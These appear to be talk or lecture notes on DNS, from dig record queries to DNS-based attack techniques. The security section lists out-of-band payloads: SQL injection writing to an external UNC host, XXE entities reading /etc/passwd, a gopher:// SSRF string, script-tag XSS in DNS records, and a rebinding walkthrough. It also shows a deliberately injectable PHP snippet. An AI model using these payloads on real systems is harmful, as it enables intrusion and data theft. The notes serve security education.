# DNS Recon Guide


## DNS Recursive requests

Where did my packet go?

```
$ nslookup -q=mx <website>
```

???????

```
192.168.0.1 => 8.8.8.8 => X.root-servers.net => Authoritative server ==> ?
```

There are lots of different record types:

### A: Get an IP address

```sh
$ dig @8.8.8.8 -t A www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 140
;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.google.com.            IN  A

;; ANSWER SECTION:
www.google.com.     151 IN  A   167.206.12.84
....

;; Query time: 46 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 13:55:31 EDT 2014
;; MSG SIZE rcvd: 299

```

### AAAA: Get an IPv6 address

```sh
$ dig @8.8.8.8 -t AAAA www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21322
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.google.com.            IN  AAAA

;; ANSWER SECTION:
www.google.com.     299 IN  AAAA    2607:f8b0:4006:80a::1011

;; Query time: 31 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 13:55:44 EDT 2014
;; MSG SIZE rcvd: 71
```

### MX: Mail server
```sh
$ dig @8.8.8.8 -t MX www.google.com
; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t MX www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63724
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.google.com.            IN  MX

;; AUTHORITY SECTION:
google.com.     41  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300

;; Query time: 29 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 13:57:48 EDT 2014
;; MSG SIZE rcvd: 93
```

### CNAME

```sh
$ dig @8.8.8.8 -t CNAME www.google.com

; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t CNAME www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9080
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.google.com.            IN  CNAME

;; AUTHORITY SECTION:
google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300

;; Query time: 30 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 13:58:23 EDT 2014
;; MSG SIZE rcvd: 93

```

### TXT: Text Data 

Any sort of binary.

```sh
dig @8.8.8.8 -t TXT www.google.com

; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t TXT www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39345
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.google.com.            IN  TXT

;; AUTHORITY SECTION:
google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300

;; Query time: 29 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 13:59:01 EDT 2014
;; MSG SIZE rcvd: 93
```

### Packet Structure

Header:


```sh
$ dig @8.8.8.8 -t A www.google.com
; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t A www.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25803
;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1
```

Where:

* ID
* Opcode
* flags: qr rd ra
* status: RCODE
* QUERY
* ANSWER
* AUTHORITY
* ADDTIONAL
* 

A query for ANY works because the TYPE of record is returned:

```sh
$ dig @8.8.8.8 -t ANY google.com

; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t ANY google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64648
;; flags: qr rd ra; QUERY: 1, ANSWER: 28, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;google.com.            IN  ANY

;; ANSWER SECTION:
google.com.     299 IN  A   167.206.10.221
...
google.com.     21599   IN  SOA ns1.google.com. dns-admin.google.com. 2014021800 7200 1800 1209600 300
google.com.     3599    IN  TXT "v=spf1 include:_spf.google.com ip4:216.73.93.70/31 ip4:216.73.93.72/31 ~all"
google.com.     599 IN  MX  40 alt3.aspmx.l.google.com.
...

;; Query time: 30 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Sep 29 15:14:48 EDT 2014
;; MSG SIZE rcvd: 640
```

---


## Reverse DNS

Works identically, but has a record of the type of PTR (and particular way of formatting the IP address backward).

How frequently is it trusted?


---

## Security 


### Recon with DNS

DNS is allowed off every network. Most traffic gets blocked by firewalls, but not the internet. DNS traffic foes through the router.

All requests to *.somesite.com go to its DNS server.



### Cross-site Scripting in Logs

Cross-site scripting occurs when HTML runs in somebody else's browser.

For example, you can set the user-agent to `<img src="http://somesite.com/img.jpg">` and then watch the DNS server.

1. HTTP Request is sent to a vulnerable server.
2. HTML is returned.
3. DNS request is sent.
4. NXDOMAIN = "host not found"

So:

1. A packet capture will look completely innocent.
2. We aren't directly connecting off the network so firewalls will never know.

We can tell when a service wants to make a connection, without the connection succeeding, and without the service even attempting to make the connection.



### SQL Injection

Two SQL queries that should cause a DNS lookup:

```
EXEC sp_addlinkedserver 'somsite.com'. N'A';
```

and

```
SELECT 1 INTO OUTFILE "\\cba.skullseclabs.org\C$";
```

Results: data theft, shell access, arbitrary read.


### XXE

XXE: returns to XML external entity attacks and lets you include files from the filesystem.

```
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;></foo>
```

And also files from remote servers:

```
<!ENTITY xxe SYSTEM "http://www.google.ca">]>
<foo>&xee;</foo>
```

### Finding XXE

Grab a resource from a domain:

```
<!ENTITY xxe SYSTEM "http://aab.skullseclabs.org">]>

<foo> &xxe; </foo>
```

Even if there is a firewall, and a weird filesystem and the file isn't send back to the user, you can still detect XXE!

### Gopher

If you ask a server to make a request for:

```
gopher://internal-ip:25/AHELO%0AMAIL+FROM...
```

If you can get a service to fetch an arbitrary gopher://URL, such as through XXE, you can attack back-end services.

Having to use DNS to exploit this is unlikely.

## PHP bad fopen()

Very similar to XXE.

Old versions of PHP allowed Internet links (http://...) in fopen()

Arbitrary file read, gopher:// issues again.


### Shell injection

Simply inject a DNS lookup into every field.

Full server access


### DNS Lookups

Untrusted.

Exploit:

Setting TXT record will change email field to a list of databases:

```sql
$addr = gethostbyaddr($_SERVER['REMOTE_ADDR']))
$details = print_r(dns_get_record($addr), true);
mysql_query("UPDATE users SET password='$details' WHERE username="$username'");
```

### Cross-site scripting

The following is a valid CNAME, MX, TXT, PTR:

```
<script/src="http://javaop.com/test-js.js'></script>
```


### DNS Re-binding

First, we look at how you can smuggle untrusted data to a protected server.
Then how to smuggle data off a protected server to the attack.

1. The user ends up at a evil page. They look it up via DNS.

2. The user is sent to an evil server.

3. While there, a session is created (authentication, cookies, etc.)

4. The session refreshes, with another DNS lookup

5. This time the evil DNS server sends them to a trusted service. The browser does not realize the server has changed.

6. The session eventually refreshes, triggering another DNS lookup

7. Any cookies/local storage/etc. can be accessed. The browser thinks its the same origin.

This show two attacks:

1. Using re-binding to sneak data into a trusted context by switching from an evil IP to a trusted one.
2. Using re-binding to sneak data out of a trusted context by switching from a trusted IP to an evil one.



Advice:

- Look at you DNS traffic, keep an eye for anomalies
- A spike in traffic can mean a DNS backdoor or some malware. ☠️